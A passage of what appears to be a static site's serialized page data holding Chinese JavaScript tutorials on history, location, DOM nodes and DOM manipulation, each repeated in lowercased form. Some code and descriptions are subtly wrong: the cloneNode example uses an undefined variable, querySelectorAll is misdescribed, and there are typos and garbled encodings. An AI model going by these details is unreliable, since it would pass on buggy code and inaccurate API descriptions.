对象方法",charIndex:296},{level:3,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:2207}],headersStr:"history 对象 history 对象属性 history 对象方法 总结",content:'# history 对象\n\n> history 对象是 windows子对象。history 接口允许操作浏览器的曾经在标签页或者框架里访问的历史记录,这些方法和事件能够帮助我们优雅的实现单页面应用，同时又不会影响搜索引擎对我们网站的搜录。现在所有的现代浏览器都已经支持这些新的特性，并且涌现出大量的路由框架，都内置集成了这些新的特性。比方说著名的vue框架里面的 vue-route等路由框架。\n\n\n# history 对象属性\n\n属性       描述                可读写性   兼容性\nlength   包含当前页面在内的历史记录个数   只读     全部\n\n\n# history 对象方法\n\n属性             参数                  返回值         功能                                          兼容性\nback           无                   undefined   加载 history 列表中的前一个 URL(等价于history.go(-1))   全部\nforward        无                   undefined   加载 history 列表中的下一个 URL(等价于history.go(1))    全部\ngo             number              undefined   通过当前页面的相对位置从浏览器历史记录加载页面                     全部\npushState      state, title, url   undefined   无刷新的向浏览器 历史最前方 加入一条记录                       >ie9\nreplaceState   state, title, url   undefined   无刷新的使用一条记录替换当前的历史记录                         >ie9\n\n * history.go方法\n   \n   * history.go(-1)： 加载上一个历史记录\n   * history.go(1)： 加载下一个历史记录\n   * history.go(0) 或不传参： 刷新本页 类似地，你可以传递参数值2并向前移动2个页面，等等。\n     如果已经没有页面，该方法不会报错，页面不会发生任何变化； 如果参数不是整数，页面也不会发生任何变化。\n\n * history.pushState 和 history.replaceState 方法有3个参数\n   \n   * 状态对象state —— 需要保存的数据，这个数据在触发popstate事件时保存在event.state上\n   * 标题title —— 浏览器目前不识别该参数，传入一个空字符串\n   * 地址URL —— 需要更改的url地址\n\n> window.onpopstate事件： 浏览器点击前进后退(或者在js中调用history.back()、history.forward()、history.go()方法)时触发的事件。event.state可以获取当前url下设置的state。\n\n注：pushState 和 replaceState方法只能加载同源下的资url源（存在跨域问题）\n\nwindow.onpopstate = function (event) {\n    console.log("location: " + document.location + ", state: " + JSON.stringify(event.state));\n};\n//绑定事件处理函数.\nhistory.pushState({ page: 1 }, "title 1", "?page=1");    //添加并激活一个历史记录条目 http://example.com/example.html?page=1,条目索引为1\nhistory.pushState({ page: 2 }, "title 2", "?page=2");    //添加并激活一个历史记录条目 http://example.com/example.html?page=2,条目索引为2\nhistory.replaceState({ page: 3 }, "title 3", "?page=3"); //修改当前激活的历史记录条目 http://ex..?page=2 变为 http://ex..?page=3,条目索引为3\nhistory.back(); // 输出 "location: http://example.com/example.html?page=1, state: {"page":1}"\nhistory.back(); // 输出 "location: http://example.com/example.html, state: null\nhistory.go(2);  // 输出 "location: http://example.com/example.html?page=3, state: {"page":3}\n\n\n\n# 总结\n\n * js刷新本页面方法汇总：\n   1. history.go(0)\n   2. location.reload()\n * js跳转页面方法汇总：\n   1. window.open(url)\n   2. location.href = ""\n   3. location.assign(url)',normalizedContent:'# history 对象\n\n> history 对象是 windows子对象。history 接口允许操作浏览器的曾经在标签页或者框架里访问的历史记录,这些方法和事件能够帮助我们优雅的实现单页面应用，同时又不会影响搜索引擎对我们网站的搜录。现在所有的现代浏览器都已经支持这些新的特性，并且涌现出大量的路由框架，都内置集成了这些新的特性。比方说著名的vue框架里面的 vue-route等路由框架。\n\n\n# history 对象属性\n\n属性       描述                可读写性   兼容性\nlength   包含当前页面在内的历史记录个数   只读     全部\n\n\n# history 对象方法\n\n属性             参数                  返回值         功能                                          兼容性\nback           无                   undefined   加载 history 列表中的前一个 url(等价于history.go(-1))   全部\nforward        无                   undefined   加载 history 列表中的下一个 url(等价于history.go(1))    全部\ngo             number              undefined   通过当前页面的相对位置从浏览器历史记录加载页面                     全部\npushstate      state, title, url   undefined   无刷新的向浏览器 历史最前方 加入一条记录                       >ie9\nreplacestate   state, title, url   undefined   无刷新的使用一条记录替换当前的历史记录                         >ie9\n\n * history.go方法\n   \n   * history.go(-1)： 加载上一个历史记录\n   * history.go(1)： 加载下一个历史记录\n   * history.go(0) 或不传参： 刷新本页 类似地，你可以传递参数值2并向前移动2个页面，等等。\n     如果已经没有页面，该方法不会报错，页面不会发生任何变化； 如果参数不是整数，页面也不会发生任何变化。\n\n * history.pushstate 和 history.replacestate 方法有3个参数\n   \n   * 状态对象state —— 需要保存的数据，这个数据在触发popstate事件时保存在event.state上\n   * 标题title —— 浏览器目前不识别该参数，传入一个空字符串\n   * 地址url —— 需要更改的url地址\n\n> window.onpopstate事件： 浏览器点击前进后退(或者在js中调用history.back()、history.forward()、history.go()方法)时触发的事件。event.state可以获取当前url下设置的state。\n\n注：pushstate 和 replacestate方法只能加载同源下的资url源（存在跨域问题）\n\nwindow.onpopstate = function (event) {\n    console.log("location: " + document.location + ", state: " + json.stringify(event.state));\n};\n//绑定事件处理函数.\nhistory.pushstate({ page: 1 }, "title 1", "?page=1");    //添加并激活一个历史记录条目 http://example.com/example.html?page=1,条目索引为1\nhistory.pushstate({ page: 2 }, "title 2", "?page=2");    //添加并激活一个历史记录条目 http://example.com/example.html?page=2,条目索引为2\nhistory.replacestate({ page: 3 }, "title 3", "?page=3"); //修改当前激活的历史记录条目 http://ex..?page=2 变为 http://ex..?page=3,条目索引为3\nhistory.back(); // 输出 "location: http://example.com/example.html?page=1, state: {"page":1}"\nhistory.back(); // 输出 "location: http://example.com/example.html, state: null\nhistory.go(2);  // 输出 "location: http://example.com/example.html?page=3, state: {"page":3}\n\n\n\n# 总结\n\n * js刷新本页面方法汇总：\n   1. history.go(0)\n   2. location.reload()\n * js跳转页面方法汇总：\n   1. window.open(url)\n   2. location.href = ""\n   3. location.assign(url)',charsets:{cjk:!0}},{title:"location 对象",frontmatter:{},regularPath:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/location%E5%AF%B9%E8%B1%A1.html",relativePath:"Javascript/JavaScriptBOM操作/location对象.md",key:"v-4724a521",path:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/location%E5%AF%B9%E8%B1%A1.html",headers:[{level:2,title:"location 对象",slug:"location-对象",normalizedTitle:"location 对象",charIndex:2},{level:3,title:"location 对象属性",slug:"location-对象属性",normalizedTitle:"location 对象属性",charIndex:131},{level:3,title:"location  对象方法",slug:"location-对象方法",normalizedTitle:"location  对象方法",charIndex:null}],headersStr:"location 对象 location 对象属性 location  对象方法",content:'# location 对象\n\n> location 对象是 windows子对象，其中包含当前窗口中加载的文档有关的信息。 location对象的用处不只表现在它保存着当前文档的信息，还表现在它将url解析为独立的片段，可以通过不同的属性访问这些片段:\n\n\n# location 对象属性\n\n> 一个完整的url 包括9个部分 协议://用户名：密码@域名：端口/路径；参数？查询#片段 不过几乎没有哪个url包含这些所有组件，最重要的三部分是协议，域名和路径:\n\n以该url为例：\n\nhttp://www.baidu.com:80/javascript/?file=001/BOM/README.md/#location对象\n\n\n属性         描述                            可读写性   结果\nhref       包含整个URL的一个字符串                 读写     http://www.baidu.com:80/javascript/001/BOM/?file=README.md#locationå¯¹è±¡\norigin     包含页面来源的域名的标准形式字符串             只读     http://www.baidu.com:80\nprotocol   包含URL对应协议的字符串，最后有一个":"        只读     http:\nhost       包含了域名和端口号的字符串，如没有端口号则只有域名     只读     www.baidu.com:80\nhostname   包含URL域名的字符串                   只读     www.baidu.com\nport       包含端口号的字符串                     只读     80\npathname   包含URL中路径部分的字符串，开头有一个"/"       只读     /javascript/001/BOM/\nsearch     包含URL参数（查询字符串）的字符串，开头有一个“?”   只读     ?file=README.md\nhash       包含块标识符的字符串，开头有一个"#"           只读     #locationå¯¹è±¡\n\n\n# location 对象方法\n\n属性         参数        返回值           功能                                            兼容性\nassign     url       undefined     加载给定URL的内容资源                                  全部\nreload     Boolean   undefined     重新加载来自当前 URL的资源(刷新本页)                         全部\nreplace    url       undefined     用给定的URL替换掉当前的资源                               全部\ntoString   无         包含整个URL的字符串   获取本窗口的url(只能获取，无法修改，读取效果与location.href相同) )   全部\n\n> location.assign与 location.replace区别: replace()替换的新页面不会被保存在会话的历史 History中，这意味着用户将不能用后退按钮转到该页面\n\nlocation.reload 的参数：\n\n * false或未写参数：检测服务器上的文档是否已改变。如果文档已改变，reload() 会再次下载该文档。如果文档未改变，则该方法将从缓存中装载文档。这与用户单击浏览器的刷新按钮的效果是完全一样的。\n * true：那么无论文档的最后修改日期是什么，它都会绕过缓存，从服务器上重新下载该文档。这与用户在单击浏览器的刷新按钮时按住 Shift 健的效果是完全一样。',normalizedContent:'# location 对象\n\n> location 对象是 windows子对象，其中包含当前窗口中加载的文档有关的信息。 location对象的用处不只表现在它保存着当前文档的信息，还表现在它将url解析为独立的片段，可以通过不同的属性访问这些片段:\n\n\n# location 对象属性\n\n> 一个完整的url 包括9个部分 协议://用户名：密码@域名：端口/路径；参数？查询#片段 不过几乎没有哪个url包含这些所有组件，最重要的三部分是协议，域名和路径:\n\n以该url为例：\n\nhttp://www.baidu.com:80/javascript/?file=001/bom/readme.md/#location对象\n\n\n属性         描述                            可读写性   结果\nhref       包含整个url的一个字符串                 读写     http://www.baidu.com:80/javascript/001/bom/?file=readme.md#locationa¯¹e±¡\norigin     包含页面来源的域名的标准形式字符串             只读     http://www.baidu.com:80\nprotocol   包含url对应协议的字符串，最后有一个":"        只读     http:\nhost       包含了域名和端口号的字符串，如没有端口号则只有域名     只读     www.baidu.com:80\nhostname   包含url域名的字符串                   只读     www.baidu.com\nport       包含端口号的字符串                     只读     80\npathname   包含url中路径部分的字符串，开头有一个"/"       只读     /javascript/001/bom/\nsearch     包含url参数（查询字符串）的字符串，开头有一个“?”   只读     ?file=readme.md\nhash       包含块标识符的字符串，开头有一个"#"           只读     #locationa¯¹e±¡\n\n\n# location 对象方法\n\n属性         参数        返回值           功能                                            兼容性\nassign     url       undefined     加载给定url的内容资源                                  全部\nreload     boolean   undefined     重新加载来自当前 url的资源(刷新本页)                         全部\nreplace    url       undefined     用给定的url替换掉当前的资源                               全部\ntostring   无         包含整个url的字符串   获取本窗口的url(只能获取，无法修改，读取效果与location.href相同) )   全部\n\n> location.assign与 location.replace区别: replace()替换的新页面不会被保存在会话的历史 history中，这意味着用户将不能用后退按钮转到该页面\n\nlocation.reload 的参数：\n\n * false或未写参数：检测服务器上的文档是否已改变。如果文档已改变，reload() 会再次下载该文档。如果文档未改变，则该方法将从缓存中装载文档。这与用户单击浏览器的刷新按钮的效果是完全一样的。\n * true：那么无论文档的最后修改日期是什么，它都会绕过缓存，从服务器上重新下载该文档。这与用户在单击浏览器的刷新按钮时按住 shift 健的效果是完全一样。',charsets:{cjk:!0}},{title:"DOM 节点",frontmatter:{},regularPath:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/DOM%E8%8A%82%E7%82%B9.html",relativePath:"Javascript/JavaScriptDOM操作/DOM节点.md",key:"v-991587be",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/DOM%E8%8A%82%E7%82%B9.html",headers:[{level:2,title:"节点的种类",slug:"节点的种类",normalizedTitle:"节点的种类",charIndex:147},{level:3,title:"节点详细信息",slug:"节点详细信息",normalizedTitle:"节点详细信息",charIndex:273},{level:2,title:"节点的属性",slug:"节点的属性",normalizedTitle:"节点的属性",charIndex:608},{level:3,title:"节点练习",slug:"节点练习",normalizedTitle:"节点练习",charIndex:1666},{level:2,title:"节点的方法",slug:"节点的方法",normalizedTitle:"节点的方法",charIndex:1730},{level:3,title:"创建并插入节点流程",slug:"创建并插入节点流程",normalizedTitle:"创建并插入节点流程",charIndex:2124}],headersStr:"节点的种类 节点详细信息 节点的属性 节点练习 节点的方法 创建并插入节点流程",content:'# DOM 节点\n\n> 在 HTML DOM 中，所有事物都是节点。DOM 是被视为节点树的 HTML。\n\nHTML 文档中的所有节点组成了一个文档树模型，HTML 文档中的每个元素、属性、文本等都代表着树中的一个节点。这些节点相互联系，相互影响，构成一个完整的页面，我们称之为模型。\n\n\n# 节点的种类\n\n 1. 元素节点 (每个 HTML 元素是元素节点)\n 2. 属性节点 (每个 HTML 属性是属性节点)\n 3. 文本节点 (文字、空格、换行)\n 4. 注释节点 (文档中的注释)\n 5. 文档节点 (整个文档是一个文档节点)\n\n\n# 节点详细信息\n\n通过节点属性我们能获得每个节点的详细信息(包括节点类型、节点名字、节点值)\n\n节点分类   节点类型(NODETYPE)   节点名称(NODENAME)   节点内容(NODEVALUE)\n元素节点   1                标签名              null\n属性节点   2                属性名              属性值\n文本节点   3                #text            文本\n注释节点   8                #comment         注释文本\n文档节点   9                #document        null\n\n\n# 节点的属性\n\n通过节点的属性，能够获取到每个节点之间的关系，并且可以通过这种关系，准确快速的获取到相应节点的对象。\n\n属性                     描述\nnode.parentNode        获取父节点\nnode.childNodes        获取子节点\nnode.firstChild        第一个子节点\nnode.lastChild         最后一个子节点\nnode.nextSibling       下一个兄弟节点\nnode.previousSibling   上一个兄弟节点\n\n> 上面的6个属性在使用的时候有些情况下我们输出的时候会显示undefined，因为在浏览器解析的时候会把换行和空格一起解析，获取的并没有错误，只是获取的这些节点是一个换行或者是一个空格。所以推荐使用下面的属性来获取，它们会只获取元素节点\n\n属性                                  可读   描述        示例\nelement.parentElement               只读   获取父元素     var parent = node.parentElement\nParentNode.children                 只读   获取所有子元素   var elements = node.children;\nParentNode.childElementCount        只读   获取子元素数量   var count = node.childElementCount;\nParentNode.firstElementChild        只读   第一个子元素    var element = node.firstElementChild;\nParentNode.lastElementChild         只读   最后一个子元素   var element = node.lastElementChild;\nParentNode.nextElementSibling       只读   下一个元素     var element = node.nextElementSibling;\nParentNode.previousElementSibling   只读   上一个元素     var element = node.previousElementSibling;\n\n\n# 节点练习\n\n编写函数：\n\n * 获取一个元素的所有子元素节点\n * 获取第一个子元素节点\n * 获取最后一个子元素节点\n\n\n# 节点的方法\n\n方法                                       描述\ndocument.createElement()                 创建一个元素节点\ndocument.createTextNode()                创建一个文本节点\nparent.appendChild(子节点)                  插入一个子节点\nparent.insertBefore(要插入的节点, 插入到某个元素之前)   插入到某个节点之前\nparent.removeChild(子节点)                  删除子节点\nparent.replaceChild(新节点,被修改的节点)          替换节点\nnode.cloneNode(boolean)                  克隆节点\n\n\n# 创建并插入节点流程\n\n 1. document.createElement("标签名") (创建标签)\n 2. 添加属性： (给创建的标签添加属性，参考DOM属性和方法)\n 3. 添加内容： (给创建的标签添加内容，参考DOM属性和方法)\n 4. 添加样式： (给创建的标签添加样式，参考DOM属性和方法)\n 5. 父元素.appendChild(子节点)\n\n> 被插入的节点，可以是新创建的，也可是页面中已经存在的\n\n 6. 父元素.insertBefore(要插入的节点, 插入到某个元素之前)\n 7. 父元素.removeChild(子节点) 删除子节点\n 8. 父元素.replaceChild(新节点,被修改的节点) 替换节点\n 9. node.cloneNode(boolean) 克隆节点\n\n<div class="box">\n  <span>克隆节点</span>\n</div>\n<script type="text/javascript">\n  var box=document.querySelector(".box");\n  // 参数为boolean，设置为true则意味着同时克隆该节点的所有子节点\n  var newBox=div.cloneNode(true);\n<\/script>\n',normalizedContent:'# dom 节点\n\n> 在 html dom 中，所有事物都是节点。dom 是被视为节点树的 html。\n\nhtml 文档中的所有节点组成了一个文档树模型，html 文档中的每个元素、属性、文本等都代表着树中的一个节点。这些节点相互联系，相互影响，构成一个完整的页面，我们称之为模型。\n\n\n# 节点的种类\n\n 1. 元素节点 (每个 html 元素是元素节点)\n 2. 属性节点 (每个 html 属性是属性节点)\n 3. 文本节点 (文字、空格、换行)\n 4. 注释节点 (文档中的注释)\n 5. 文档节点 (整个文档是一个文档节点)\n\n\n# 节点详细信息\n\n通过节点属性我们能获得每个节点的详细信息(包括节点类型、节点名字、节点值)\n\n节点分类   节点类型(nodetype)   节点名称(nodename)   节点内容(nodevalue)\n元素节点   1                标签名              null\n属性节点   2                属性名              属性值\n文本节点   3                #text            文本\n注释节点   8                #comment         注释文本\n文档节点   9                #document        null\n\n\n# 节点的属性\n\n通过节点的属性，能够获取到每个节点之间的关系，并且可以通过这种关系，准确快速的获取到相应节点的对象。\n\n属性                     描述\nnode.parentnode        获取父节点\nnode.childnodes        获取子节点\nnode.firstchild        第一个子节点\nnode.lastchild         最后一个子节点\nnode.nextsibling       下一个兄弟节点\nnode.previoussibling   上一个兄弟节点\n\n> 上面的6个属性在使用的时候有些情况下我们输出的时候会显示undefined，因为在浏览器解析的时候会把换行和空格一起解析，获取的并没有错误，只是获取的这些节点是一个换行或者是一个空格。所以推荐使用下面的属性来获取，它们会只获取元素节点\n\n属性                                  可读   描述        示例\nelement.parentelement               只读   获取父元素     var parent = node.parentelement\nparentnode.children                 只读   获取所有子元素   var elements = node.children;\nparentnode.childelementcount        只读   获取子元素数量   var count = node.childelementcount;\nparentnode.firstelementchild        只读   第一个子元素    var element = node.firstelementchild;\nparentnode.lastelementchild         只读   最后一个子元素   var element = node.lastelementchild;\nparentnode.nextelementsibling       只读   下一个元素     var element = node.nextelementsibling;\nparentnode.previouselementsibling   只读   上一个元素     var element = node.previouselementsibling;\n\n\n# 节点练习\n\n编写函数：\n\n * 获取一个元素的所有子元素节点\n * 获取第一个子元素节点\n * 获取最后一个子元素节点\n\n\n# 节点的方法\n\n方法                                       描述\ndocument.createelement()                 创建一个元素节点\ndocument.createtextnode()                创建一个文本节点\nparent.appendchild(子节点)                  插入一个子节点\nparent.insertbefore(要插入的节点, 插入到某个元素之前)   插入到某个节点之前\nparent.removechild(子节点)                  删除子节点\nparent.replacechild(新节点,被修改的节点)          替换节点\nnode.clonenode(boolean)                  克隆节点\n\n\n# 创建并插入节点流程\n\n 1. document.createelement("标签名") (创建标签)\n 2. 添加属性： (给创建的标签添加属性，参考dom属性和方法)\n 3. 添加内容： (给创建的标签添加内容，参考dom属性和方法)\n 4. 添加样式： (给创建的标签添加样式，参考dom属性和方法)\n 5. 父元素.appendchild(子节点)\n\n> 被插入的节点，可以是新创建的，也可是页面中已经存在的\n\n 6. 父元素.insertbefore(要插入的节点, 插入到某个元素之前)\n 7. 父元素.removechild(子节点) 删除子节点\n 8. 父元素.replacechild(新节点,被修改的节点) 替换节点\n 9. node.clonenode(boolean) 克隆节点\n\n<div class="box">\n  <span>克隆节点</span>\n</div>\n<script type="text/javascript">\n  var box=document.queryselector(".box");\n  // 参数为boolean，设置为true则意味着同时克隆该节点的所有子节点\n  var newbox=div.clonenode(true);\n<\/script>\n',charsets:{cjk:!0}},{title:"DOM 文档对象模型",frontmatter:{},regularPath:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/DOM.html",relativePath:"Javascript/JavaScriptDOM操作/DOM.md",key:"v-12c5f263",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/DOM.html",headers:[{level:2,title:"DOM属性和方法",slug:"dom属性和方法",normalizedTitle:"dom属性和方法",charIndex:137},{level:3,title:"属性",slug:"属性",normalizedTitle:"属性",charIndex:140},{level:3,title:"方法",slug:"方法",normalizedTitle:"方法",charIndex:143},{level:3,title:"获取元素",slug:"获取元素",normalizedTitle:"获取元素",charIndex:1391},{level:2,title:"操作内容",slug:"操作内容",normalizedTitle:"操作内容",charIndex:1932},{level:3,title:"对象.innerHTML",slug:"对象-innerhtml",normalizedTitle:"对象.innerhtml",charIndex:1958},{level:3,title:"对象.innerText",slug:"对象-innertext",normalizedTitle:"对象.innertext",charIndex:2005},{level:3,title:"对象.textContent",slug:"对象-textcontent",normalizedTitle:"对象.textcontent",charIndex:2043},{level:2,title:"操作样式",slug:"操作样式",normalizedTitle:"操作样式",charIndex:2287},{level:3,title:"修改类名、id",slug:"修改类名、id",normalizedTitle:"修改类名、id",charIndex:2296},{level:3,title:"修改行内样式",slug:"修改行内样式",normalizedTitle:"修改行内样式",charIndex:2691},{level:2,title:"操作属性",slug:"操作属性",normalizedTitle:"操作属性",charIndex:2976},{level:3,title:"原生属性",slug:"原生属性",normalizedTitle:"原生属性",charIndex:2985},{level:3,title:"自定义属性",slug:"自定义属性",normalizedTitle:"自定义属性",charIndex:3087}],headersStr:"DOM属性和方法 属性 方法 获取元素 操作内容 对象.innerHTML 对象.innerText 对象.textContent 操作样式 修改类名、id 修改行内样式 操作属性 原生属性 自定义属性",content:'# DOM 文档对象模型\n\n> DOM 是 Document Object Model（文档对象模型）的缩写。 是用来呈现以及与任意 HTML 或 XML 交互的API文档。DOM 是载入到浏览器中的文档模型，它用节点树的形式来表现文档，每个节点代表文档的构成部分\n\n\n# DOM属性和方法\n\n\n# 属性\n\n属性                描述                          读写\nURL               网站的url                      只读\ncharset           查看字符集                       只读\ntitle             文档的标题                       读写\nforms             文档中所有的form表单元素              只读\nimgages           文档中所有的img元素                 只读\nbody              获取body标签                    只读\nhead              获取head标签                    只读\ndocumentElement   获取html标签                    只读\ncookie            当前页面Cookie值的情况，它的值是一个字符串。   读写\n\n\n# 方法\n\n方法                                         描述                返回值         兼容性\ndocument.write("string")                   动态向页面写入内容         undefined   >=IE6,Chrome,Firefox\ndocument.getElementsByTagName("tagName")   通过标签名获取DOM元素      类数组         >=IE6,Chrome,Firefox\ndocument.getElementsByClassName("class")   通过类名获取DOM元素       类数组         >=IE8,Chrome,Firefox\ndocument.getElementById("id")              通过id获取DOM元素       DOM对象       >=IE6,Chrome,Firefox\ndocument.getElementsByName("name")         通过name属性获取DOM元素   类数组         >=IE6,Chrome,Firefox\ndocument.querySelector("css选择器")           通过css选择器获取DOM元素   DOM对象       >=IE8,Chrome,Firefox\ndocument.querySelectorAll("css选择器")        通过name属性获取DOM元素   类数组         >=IE8,Chrome,Firefox\n\n\n# 获取元素\n\n通过标签名获取元素，返回值为 类数组\n\ndocument.getElementsByTagName()\n\n\n通过类名获取元素，返回值为类数组，IE6-8不支持\n\ndocument.getElementsByClassName()\n\n\n通过id获取元素 返回值为DOM对象，只能获取第一个拥有该id的元素 在IE6、7中会把表单元素的name当做ID值获取到。\n\ndocument.getElementById()        \n\n\n通过name属性获取元素，返回值为类数组\n在IE浏览器中只能获取到表单元素，一般也只用它获取表单元素，从ie10开始可以不只是表单元素。\n\ndocument.getElementsByName()              \n\n\n通过css选择器获取元素，不兼容IE7以及以下版本\n\n 1. 获取单个元素，返回值为DOM对象\n\ndocument.querySelector("css选择器")\n\n\n 2. 获取多个元素，返回值为类数组\n\ndocument.querySelectorAll("css选择器")\n\n\n> 注意：获取元素的时候，document可以写成其他的DOM对象，这样表示从这个DOM对象内部来进行再次筛选。\n\n\n# 操作内容\n\n属性               描述\n对象.innerHTML     可访问，可修改，可以识别标签，用来给元素内添加子标签很方便\n对象.innerText     可访问，可修改，输出纯文本，无法识别标签\n对象.textContent   可访问，可修改，输出纯文本，保留文本格式\n\n\n# 对象.innerHTML\n\n> 可访问，可修改 可以识别标签，用来给元素内添加子标签很方便\n\n对象.innerHTML = "内容"\n\n\n\n# 对象.innerText\n\n> 可访问，可修改 输出纯文本，无法识别标签\n\n对象.innerText = "内容"\n\n\n\n# 对象.textContent\n\n> 可访问，可修改 输出纯文本，保留文本格式\n\n对象.textContent = "内容"\n\n\n\n# 操作样式\n\n\n# 修改类名、id\n\nclassName 访问、修改DOM对象的类名\n\n对象.className = "类名"\n\n\nclassList 操作DOM对象类名\n\n方法                          描述\nlassList.add(类名1,类名2)       不修改原类名，添加新类名，可同时添加多个\nclassList.remove(类名1,类名2)   删除某一类名\nclassList.contains(类名)      判断一个类名是否存在\nclassList.toggle(类名1,类名2)   如果类名已存在，则删除；如果类名没有，则添加\n\n> 注意： IE11及以下都不支持add、remove、toggle的多个参数\n\n对象.classList.add("类名")\n对象.classList.remove("类名")\n\n\n> 注意： IE9及以下不支持\n\n\n# 修改行内样式\n\n当样式名作为对象的属性名时，样式名需要使用驼峰命名法，因为对象的属性名不能包含- 例如：fontSize\n\n对象.style.样式属性 = "样式值"       // 不会覆盖原样式\n\n// 所有行内样式组成的字符串\n// 等价于重写行内样式 (不需要驼峰命名法)\n// 原本行内样式会被覆盖\n对象.style.cssText = ""      \n\n// 原本行内样式 不会 覆盖\n对象.style.cssText += ""      \n\n\n获取行内样式及外部引入样式\n\nwindow.getComputedStyle(对象).样式属性\n\n\n\n# 操作属性\n\n\n# 原生属性\n\n> html标签自带的属性\n\n对象.属性名 = "属性值"\n对象.className = "类名"\n\n\n例如：\n\ndiv.id = "box"\ninput.name = "age"\n\n\n\n# 自定义属性\n\n方法                         描述\n对象.setAttribute(属性名,属性值)   设置属性\n对象.getAttribute(属性名)       获取属性\n对象.removeAttribute(属性名)    删除属性\n对象.hasAttribute(属性名)       检测属性\n\n对象.setAttribute(属性名,属性值)\n对象.getAttribute(属性名)\n对象.hasAttribute(属性名)\n对象.removeAttribute(属性名)\n\n\n> 往HTML标签上添加自定义属性来存储和操作数据,例如我们把图片的地址存放到自定义属性上，需要加载时再把属性值赋给img的src属性，等等操作',normalizedContent:'# dom 文档对象模型\n\n> dom 是 document object model（文档对象模型）的缩写。 是用来呈现以及与任意 html 或 xml 交互的api文档。dom 是载入到浏览器中的文档模型，它用节点树的形式来表现文档，每个节点代表文档的构成部分\n\n\n# dom属性和方法\n\n\n# 属性\n\n属性                描述                          读写\nurl               网站的url                      只读\ncharset           查看字符集                       只读\ntitle             文档的标题                       读写\nforms             文档中所有的form表单元素              只读\nimgages           文档中所有的img元素                 只读\nbody              获取body标签                    只读\nhead              获取head标签                    只读\ndocumentelement   获取html标签                    只读\ncookie            当前页面cookie值的情况，它的值是一个字符串。   读写\n\n\n# 方法\n\n方法                                         描述                返回值         兼容性\ndocument.write("string")                   动态向页面写入内容         undefined   >=ie6,chrome,firefox\ndocument.getelementsbytagname("tagname")   通过标签名获取dom元素      类数组         >=ie6,chrome,firefox\ndocument.getelementsbyclassname("class")   通过类名获取dom元素       类数组         >=ie8,chrome,firefox\ndocument.getelementbyid("id")              通过id获取dom元素       dom对象       >=ie6,chrome,firefox\ndocument.getelementsbyname("name")         通过name属性获取dom元素   类数组         >=ie6,chrome,firefox\ndocument.queryselector("css选择器")           通过css选择器获取dom元素   dom对象       >=ie8,chrome,firefox\ndocument.queryselectorall("css选择器")        通过name属性获取dom元素   类数组         >=ie8,chrome,firefox\n\n\n# 获取元素\n\n通过标签名获取元素，返回值为 类数组\n\ndocument.getelementsbytagname()\n\n\n通过类名获取元素，返回值为类数组，ie6-8不支持\n\ndocument.getelementsbyclassname()\n\n\n通过id获取元素 返回值为dom对象，只能获取第一个拥有该id的元素 在ie6、7中会把表单元素的name当做id值获取到。\n\ndocument.getelementbyid()        \n\n\n通过name属性获取元素，返回值为类数组\n在ie浏览器中只能获取到表单元素，一般也只用它获取表单元素，从ie10开始可以不只是表单元素。\n\ndocument.getelementsbyname()              \n\n\n通过css选择器获取元素，不兼容ie7以及以下版本\n\n 1. 获取单个元素，返回值为dom对象\n\ndocument.queryselector("css选择器")\n\n\n 2. 获取多个元素，返回值为类数组\n\ndocument.queryselectorall("css选择器")\n\n\n> 注意：获取元素的时候，document可以写成其他的dom对象，这样表示从这个dom对象内部来进行再次筛选。\n\n\n# 操作内容\n\n属性               描述\n对象.innerhtml     可访问，可修改，可以识别标签，用来给元素内添加子标签很方便\n对象.innertext     可访问，可修改，输出纯文本，无法识别标签\n对象.textcontent   可访问，可修改，输出纯文本，保留文本格式\n\n\n# 对象.innerhtml\n\n> 可访问，可修改 可以识别标签，用来给元素内添加子标签很方便\n\n对象.innerhtml = "内容"\n\n\n\n# 对象.innertext\n\n> 可访问，可修改 输出纯文本，无法识别标签\n\n对象.innertext = "内容"\n\n\n\n# 对象.textcontent\n\n> 可访问，可修改 输出纯文本，保留文本格式\n\n对象.textcontent = "内容"\n\n\n\n# 操作样式\n\n\n# 修改类名、id\n\nclassname 访问、修改dom对象的类名\n\n对象.classname = "类名"\n\n\nclasslist 操作dom对象类名\n\n方法                          描述\nlasslist.add(类名1,类名2)       不修改原类名，添加新类名，可同时添加多个\nclasslist.remove(类名1,类名2)   删除某一类名\nclasslist.contains(类名)      判断一个类名是否存在\nclasslist.toggle(类名1,类名2)   如果类名已存在，则删除；如果类名没有，则添加\n\n> 注意： ie11及以下都不支持add、remove、toggle的多个参数\n\n对象.classlist.add("类名")\n对象.classlist.remove("类名")\n\n\n> 注意： ie9及以下不支持\n\n\n# 修改行内样式\n\n当样式名作为对象的属性名时，样式名需要使用驼峰命名法，因为对象的属性名不能包含- 例如：fontsize\n\n对象.style.样式属性 = "样式值"       // 不会覆盖原样式\n\n// 所有行内样式组成的字符串\n// 等价于重写行内样式 (不需要驼峰命名法)\n// 原本行内样式会被覆盖\n对象.style.csstext = ""      \n\n// 原本行内样式 不会 覆盖\n对象.style.csstext += ""      \n\n\n获取行内样式及外部引入样式\n\nwindow.getcomputedstyle(对象).样式属性\n\n\n\n# 操作属性\n\n\n# 原生属性\n\n> html标签自带的属性\n\n对象.属性名 = "属性值"\n对象.classname = "类名"\n\n\n例如：\n\ndiv.id = "box"\ninput.name = "age"\n\n\n\n# 自定义属性\n\n方法                         描述\n对象.setattribute(属性名,属性值)   设置属性\n对象.getattribute(属性名)       获取属性\n对象.removeattribute(属性名)    删除属性\n对象.hasattribute(属性名)       检测属性\n\n对象.setattribute(属性名,属性值)\n对象.getattribute(属性名)\n对象.hasattribute(属性名)\n对象.removeattribute(属性名)\n\n\n> 往html标签上添加自定义属性来存储和操作数据,例如我们把图片的地址存放到自定义属性上，需要加载时再把属性值赋给img的src属性，等等操作',charsets:{cjk:!0}},{title:"JavaScript动画",frontmatter:{},regularPath:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/JavaScript%E5%8A%A8%E7%94%BB.html",relativePath:"Javascript/JavaScriptDOM操作/JavaScript动画.md",key:"v-a5269cf6",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/JavaScript%E5%8A%A8%E7%94%BB.html",headers:[{level:2,title:"Web Animations API",slug:"web-animations-api",normalizedTitle:"web animations 